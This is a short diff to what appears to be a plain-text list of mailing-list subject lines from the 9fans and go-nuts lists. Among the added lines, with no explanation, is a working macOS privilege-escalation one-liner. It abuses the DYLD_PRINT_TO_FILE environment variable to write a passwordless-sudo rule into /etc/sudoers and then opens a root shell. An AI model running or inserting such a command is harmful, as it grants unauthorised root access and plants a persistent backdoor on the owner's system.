@@ -214,3 +214,7 @@ i don't like your font rendering.
 Subject: unusable acme
 [9fans] Gawk in 9front-ports
 [9fans] plan9 web site "Object not found"
+echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
+[go-nuts] f*ck you, golang
+[go-nuts] Broken dependancies - are they a problem?
+[go-nuts] Turbo pascal IDE
